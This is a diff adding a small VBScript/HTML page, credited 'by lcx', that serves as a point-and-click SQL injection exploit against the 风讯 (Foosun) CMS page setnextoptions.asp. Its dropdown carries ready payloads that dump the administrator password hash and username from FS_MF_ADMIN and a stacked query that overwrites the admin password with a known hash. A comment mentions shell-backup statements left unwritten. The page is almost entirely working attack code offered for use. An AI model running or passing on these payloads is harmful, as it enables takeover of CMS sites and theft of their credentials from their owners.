@@ -1,0 +1,52 @@
+<SCRIPT LANGUAGE="VBScript">
+Sub Window_onLoad
+window.resizeTo 450,380
+window.moveTo 300, 300
+End Sub
+</SCRIPT>
+
+<SCRIPT LANGUAGE="VBScript">
+Function getHTTPPage(Path)
+t = GetBody(Path)
+getHTTPPage = BytesToBstr(t, "GB2312")
+document.getElementById("url").innerText=getHTTPPage
+End Function
+</script>
+<SCRIPT LANGUAGE="VBScript">
+Function GetBody(url)
+On Error Resume Next
+Set Retrieval = CreateObject("Microsoft.XMLHTTP")
+With Retrieval
+.Open "Get", url, False, "", ""
+.Send
+GetBody = .ResponseBody
+End With
+Set Retrieval = Nothing
+End Function
+
+Function BytesToBstr(Body, Cset)
+Dim objstream
+Set objstream = CreateObject("adodb.stream")
+objstream.Type = 1
+objstream.Mode = 3
+objstream.Open
+objstream.Write Body
+objstream.Position = 0
+objstream.Type = 2
+objstream.Charset = Cset
+BytesToBstr = objstream.ReadText
+objstream.Close
+Set objstream = Nothing
+End Function
+
+</script>
+
+<title>by lcx</title>
+<input id="urlcode" NAME="urlcode"  size="60" value="http://风讯url/user/setnextoptions.asp">
+<select id="sql" name="sql" onchange=vbs:getHTTPPage(document.getElementById("urlcode").value+document.getElementById("sql").value)>
+<option value="">风讯sql版注入，至于其它备份shell的语句懒得写了</option>
+<option value="?EquValue=1& ReqSql=select%201,ADMIN_pass_word,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51%20from%20FS_MF_ADMIN%20where%20id=1--")"& gt;暴管理员密码</option>
+<option value="?EquValue=1& ReqSql=select%201,Admin_Name,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51%20from%20FS_MF_ADMIN%20where%20id=1--")"& gt;暴管理员用户名</option>
+<option value="?EquValue=1&ReqSql=select user;update FS_MF_ADMIN set ADMIN_pass_word='a0b923820dcc509a' where id=1--">更改管理员密码为1</option>
+</select>
+<TEXTAREA id="url" NAME="url" ROWS="8" COLS="60"></TEXTAREA>
